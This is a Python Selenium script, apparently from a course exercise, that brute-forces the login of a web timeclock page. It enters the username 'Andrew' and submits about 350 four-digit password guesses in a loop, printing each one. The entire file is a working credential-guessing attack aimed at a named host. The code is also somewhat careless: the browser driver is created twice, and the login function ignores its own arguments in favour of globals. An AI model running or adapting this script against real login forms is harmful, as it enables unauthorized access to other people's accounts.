import time
from time import sleep
from selenium import webdriver

PATH = "C:/Users/SCE/Desktop/chromedriver.exe"
driver = webdriver.Chrome(PATH)
#
# pw1=(pw/32)
# pw2=(pw%32)
# employee = driver.find_element_by_name('employee_passwd')
# employee.send_keys("%.2d%.2d"%(pw1,pw2))
# print("%.2d%.2d"%(pw1,pw2))
usrname = "Andrew"  # 輸入帳號

options = webdriver.ChromeOptions()
driver = webdriver.Chrome(PATH)


def begin():
    driver.get('chrome://settings/')
    driver.execute_script('chrome.settingsPrivate.setDefaultZoom(0.6);')
    time.sleep(1)
    driver.get('http://ntc.im/se211/timeclock.php')


def login(k1, k2, name):
    # 輸入帳號
    username = driver.find_element_by_name('left_displayname')
    username.send_keys(name)

    # 輸入密碼

    employee = driver.find_element_by_name('employee_passwd')
    employee.send_keys("%.2d%.2d" % (pw1, pw2))
    print("%.2d%.2d" % (pw1, pw2))

    b = driver.find_element_by_name('left_inout')
    b.send_keys("out")

    # 按下登入/送出鈕
    btnSubmit = driver.find_element_by_css_selector('button[type="submit"]')
    btnSubmit.submit()

    # 強制等待
    sleep(0.1)


# 主程式
if __name__ == '__main__':
    begin()
    for pw in range(32, 380):
        pw1 = (pw / 32)
        pw2 = (pw % 32)
        login(pw1, pw2, usrname)
